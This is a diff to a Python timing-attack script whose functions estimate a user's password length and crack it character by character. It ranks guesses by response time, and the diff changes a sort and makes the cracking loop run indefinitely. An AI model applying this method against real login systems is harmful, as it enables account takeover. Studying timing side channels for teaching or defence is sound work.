@@ -38,7 +38,7 @@ def estimate_password_length(user: str, max_len: int = 32, trials: int = 1000, v
         exp = np.exp(z - np.max(z))
         confidence = exp / np.sum(exp)
 
-        top = np.argsort(sample_times)[::-1][:5]
+        top = np.argsort(-sample_times)[:5]
 
         print("------ Length Estimation Results -------")
         print(f"{'len':>4} | {'time':>9} | {'z-score':>7} | {'confidence':>10}")
@@ -59,7 +59,7 @@ def crack_password(user: str, length: int, trials: int = 1000, verbose: bool = F
     guess_time = time_password(user, guess, trials)
     sample_times = np.empty(len(ALLOWED_CHARS))
 
-    for i in range(1):
+    while True:
         for position in range(length):
             for i, candidate_char in enumerate(ALLOWED_CHARS):
                 sample = guess[:position] + candidate_char + guess[position + 1:]
@@ -80,7 +80,7 @@ def crack_password(user: str, length: int, trials: int = 1000, verbose: bool = F
                 exp = np.exp(z - np.max(z))
                 confidence = exp / np.sum(exp)
 
-                top = np.argsort(sample_times)[::-1][:5]
+                top = np.argsort(-sample_times)[:5]
 
                 print(f"---- Character #{position} Estimation Results ----")
                 print(f"{'char':>5} | {'time':>9} | {'z-score':>7} | {'confidence':>10}")
